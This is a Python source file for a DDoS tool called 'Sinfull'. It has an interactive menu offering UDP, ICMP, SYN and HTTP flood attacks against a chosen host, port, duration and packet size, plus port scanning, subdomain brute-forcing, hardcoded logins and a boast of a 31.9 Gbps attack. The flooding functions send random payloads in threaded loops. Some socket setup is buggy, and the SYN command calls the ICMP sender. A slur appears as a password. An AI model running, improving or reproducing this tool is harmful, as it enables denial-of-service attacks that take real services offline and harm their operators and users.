import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;S I N F U L L |SIN| D E M O N S\x07")
def modifications():
	print ("Contact Misfortune or Reaper the script is currently under maitnance")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
method = """\033[91m
+------------------------------------------------------+
¦                     \033[00mDDoS METHODS\033[91m                     ¦               
¦------------------------------------------------------¦
¦ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m UDP ATTACK\033[91m    ¦
¦ \033[00mICMP <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m ICMP ATTACK\033[91m   ¦
¦ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m SYN ATTACK\033[91m    ¦
¦ \033[00mHTTP  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m|\033[00m HTTP ATTACK\033[91m   ¦
+------------------------------------------------------+\033[00m
"""

info = """
[\033[91mSIN\033[00m] \033[91mMade By reaper, most credit goes to a freind of mines whom taught me python
Most/Everything im available to do today is mainly for that freind kicking me into it so big thanks.
Bigest attack: 31.9 gbps
"""

version = "3.2"

help = """\033[91m
+------------------------------------------------------+
¦                    \033[00mBASIC COMMANDS\033[91m                    ¦
¦------------------------------------------------------¦
¦ \033[00mClear                         \033[91m|\033[00m CLEAR SCREEN\033[91m         ¦
¦ \033[00mExit                          \033[91m|\033[00m EXIT SINFULL\033[91m         ¦
¦ \033[00mMethods                       \033[91m|\033[00m SINS METHODS\033[91m         ¦
¦ \033[00mTools                         \033[91m|\033[00m BASIC TOOLS\033[91m          ¦
¦ \033[00mUpdates                       \033[91m|\033[00m DISPLAY UPDATE NOTES\033[91m ¦
¦ \033[00mInfo                          \033[91m|\033[00m DISPLAY SINFULLS INFO\033[91m¦
+------------------------------------------------------+\033[00m
"""

tools = """\033[91m
+------------------------------------------------------+
¦                        \033[00mTOOLS\033[91m                         ¦
¦------------------------------------------------------¦
¦ \033[00mStopattacks                   \033[91m|\033[00m STOP ALL ATTACKS\033[91m     ¦
¦ \033[00mAttacks                       \033[91m|\033[00m RUNNING ATTACKS\033[91m      ¦
¦ \033[00mPing <HOST>                   \033[91m|\033[00m PING A HOST\033[91m          ¦
¦ \033[00mResolve <HOST>                \033[91m|\033[00m GRAB A DOMIANS IP\033[91m    ¦
¦ \033[00mPortscan <HOST> <RANGE>       \033[91m|\033[00m PORTSCAN A HOST  \033[91m    ¦
¦ \033[00mDnsresolve <HOST>             \033[91m|\033[00m GRAB ALL SUB-DOMAINS\033[91m ¦
¦ \033[00mStats                         \033[91m|\033[00m DISPLAY SINFULL STATS\033[91m¦
+------------------------------------------------------+\033[00m
"""

updatenotes = """\033[91m
+------------------------------------------------------+
¦                     \033[00mUPDATE NOTES\033[91m                     ¦
¦------------------------------------------------------¦
¦ \033[00m- Better ascii menu\033[91m                                  ¦
¦ \033[00m- Updated command casing no longer only capital\033[91m      ¦
¦ \033[00m- Updated attack methods\033[91m                             ¦
¦ \033[00m- Timeout bug fixed\033[91m                                  ¦
¦ \033[00m- Background attacks\033[91m                                 ¦
¦ \033[00m- Running task displayer\033[91m                             ¦
¦ \033[00m- All tools fixed and working\033[91m                        ¦
+------------------------------------------------------+\033[00m
"""
statz = """
¦              \033[00mSTATS\033[91m                     ¦
\033[00m- Attacks: \033[91m{}                                        
\033[00m- Found Domains: \033[91m{}                                  
\033[00m- PINGS: \033[91m{}                                          
\033[00m- PORTSCANS: \033[91m{}                                      
\033[00m- GRABBED IPS: \033[91m{}                                 
+------------------------------------------------------+\033[00m"""
banner = """\033[1;00m
 .|'''.|   ||           '||''''|          '||  '||
 ||..  '  ...  .. ...    ||  .   ... ...   ||   ||
  ''|||.   ||   ||  ||   ||''|    ||  ||   ||   ||
.     '||  ||   ||  ||   ||       ||  ||   ||   ||
|'....|'  .||. .||. ||. .||.      '|..'|. .||. .||.
                       \033[1;91m? ? ?\033[00m
"""

altbanner = """
			      Angels go to heaven
			   Demons meet the gates of hell
		      Sinfull people are punished put in hell
		      		  S I N F U L L 
"""

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write("\x1b]2;S I N F U L L\x07")
		sin = input("\033[1;00m[\033[91mSINFULL\033[1;00m]-\033[91m?\033[00m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (altbanner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "version":
			print ("sinful version: "+version+" ")
		elif sinput == "stats":
			print ("\033[00m- Attacks: \033[91m{}                                        ".format (tattacks))
			print ("\033[00m- Found Domains: \033[91m{}                                  ".format(fsubs))
			print ("\033[00m- PINGS: \033[91m{}                                          ".format(tpings))
			print ("\033[00m- PORTSCANS: \033[91m{}                                      ".format(pscans))
			print ("\033[00m- GRABBED IPS: \033[91m{}\n                                    ".format(liips))
			main()
		elif sinput == "methods":
			print (method)
			main()
		elif sinput == "tools":
			print (tools)
			main()
		elif sinput == "portscan":
			port_range = int(sin.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\033[91mSIN\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "attacks":
			print ("\n[\033[91mSIN\033[00m] UPD Running processes: {}".format (uaid))
			print ("[\033[91mSIN\033[00m] ICMP Running processes: {}".format (iaid))
			print ("[\033[91mSIN\033[00m] SYN Running processes: {}".format (said))
			print ("[\033[91mSIN\033[00m] Total attacks running: {}\n".format (aid))
			main()
		elif sinput == "dnsresolve":
			sfound = 0
			sys.stdout.write("\x1b]2;S I N F U L L |{}| F O U N D\x07".format (sfound))
			try:
				host = sin.split(" ")[1]
				with open(r"/usr/share/sinfull/subnames.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + host
						subips = socket.gethostbyname(url)
						print ("[\033[91mSIN\033[00m] Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;S I N F U L L |{}| F O U N D\x07".format (sfound))
					except socket.error:
						pass
						#print ("[\033[91mSIN\033[00m] Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
				print ("[\033[91mSIN\033[00m] Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE HOST!')
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mSIN\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[91mSIN\033[00m] Starting ping on host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[91mSIN\033[00m] Host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;S I N F U L L |{}ms| D E M O N S\x07".format (stop))
						print ("Sinfull: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;S I N F U L L |TIME OUT| D E M O N S\x07")
						print ("Sinfull: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "udp":
			if username == "guests":
				print ("[\033[91mSIN\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "http":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack sent to: {}".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
				main()
		elif sinput == "icmp":
			if username == "guests":
				print ("[\033[91mSIN\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack sent to: {}".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mSIN\033[00m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[91mSIN\033[00m] No ICMP processes running")
					udp = True
					main()
		else:
			print ("[\033[91mSIN\033[00m] {} Not a command".format(sinput))
			main()



try:
	users = ["root", "guests"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username (root): ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, exiting")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["root", "gayman"]
	password = getpass.getpass ("[+] Password (root): ")
	if user == "root":
		if password == passwords[0]:
			print ("[+] Login correct")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("[+] Login correct")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()
